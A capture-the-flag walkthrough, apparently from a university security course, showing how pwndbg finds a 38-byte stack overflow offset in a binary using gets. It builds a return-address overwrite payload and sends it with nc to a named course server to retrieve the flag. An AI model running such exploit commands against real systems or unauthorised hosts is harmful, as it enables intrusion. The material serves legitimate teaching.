# Stack Smashing Walkthrough with pwndbg

This walkthrough demonstrates using pwndbg to exploit the challenge. pwndbg is a GDB plugin that provides enhanced debugging features for exploit development.

## Setup

### Install pwndbg

```
cd /home/judah/CS466
git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh
```

After setup, pwndbg loads automatically when you start `gdb`.

### Launch GDB

```
cd /home/judah/CS466/ctf/stacksmashing
gdb ./ctf.exe
```

You should see:
```
pwndbg: loaded 212 pwndbg commands. Type pwndbg [filter] for a list.
```

## Step 1: Disassemble main

View the vulnerable code:

```
pwndbg> disassemble main
```

Key observations:
- `0x0804984f <+90>:  lea eax,[ebp-0x22]` — buffer at `ebp-0x22`
- `0x08049853 <+94>:  call 0x8052af0 <gets>` — vulnerable gets call
- `0x08049858 <+99>:  add esp, 4` — returns after gets

## Step 2: Generate cyclic pattern

Create a unique pattern to find the exact offset:

```
pwndbg> cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
```

The pattern is displayed and ready to paste.

## Step 3: Set breakpoint

Break after `gets` to inspect the stack:

```
pwndbg> b *0x08049858
Breakpoint 1 at 0x8049858
```

## Step 4: Run and enter pattern

Start the program:

```
pwndbg> run
Starting program: ...
Where are we supposed to go?
```

Paste the cyclic pattern when prompted:

```
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
```

The program breaks at `0x08049858`.

## Step 5: Analyze the crash

pwndbg displays enhanced output:

**REGISTERS section:**
- Shows all CPU registers
- Notice `EBP 0xffffd1c8 ◂— 'aajaaakaa...'` — saved EBP is corrupted

**BACKTRACE section:**
- Shows corrupted return addresses:
  - `0x616b6161` (aaka)
  - `0x616c6161` (aala)
  - `0x616d6161` (aama)

## Step 6: Find the offset

Use `cyclic -l` to find where the return address starts:

```
pwndbg> cyclic -l 0x616b6161
Finding cyclic pattern of 4 bytes: b'aaka' (hex: 0x61616b61)
Found at offset 38
```

**The offset to EIP is 38 bytes.**

## Step 7: Find the target function

List functions to find the win function:

```
pwndbg> info functions flag
All functions matching regular expression "flag":

Non-debugging symbols:
0x08049865  flag
```

**Target address: 0x08049865**

## Step 8: Build the payload

Craft the payload with:
- 38 bytes of padding
- Target address `0x08049865` in little-endian: `\x65\x98\x04\x08`

## Step 9: Local test (optional)

```
python3 - <<'PY' | ./ctf.exe
import sys
sys.stdout.buffer.write(b"A"*38 + b"\x65\x98\x04\x08")
PY
```

## Step 10: Remote exploit

Send to the remote service:

```
python3 - <<'PY' | nc moa6.eecs.utk.edu 3002
import sys
sys.stdout.buffer.write(b"A"*38 + b"\x65\x98\x04\x08" + b"\n")
PY
```

Expected output:
```
Where are we supposed to go?
Well, that was quick. Here's your flag:
cosc466-flag-{9fajkasnvkdjk}
```

## Key pwndbg Commands Used

- `cyclic <length>` — generate unique pattern
- `cyclic -l <address>` — find offset at address
- `disassemble <func>` — show assembly
- `b *<address>` — set breakpoint
- `run` — start program
- `stack` — annotated stack dump
- `registers` — enhanced register display
- `info functions <regex>` — find functions

## Why pwndbg > plain GDB

- **Automatic pattern generation**: No manual pattern construction
- **Color output**: Easier to read stack and registers
- **Cyclic offset lookup**: Automated offset finding instead of manual byte counting
- **Better annotations**: Stack shows what's what, not just raw bytes
- **ROP gadgets**: Can search for gadgets (`rop command`)
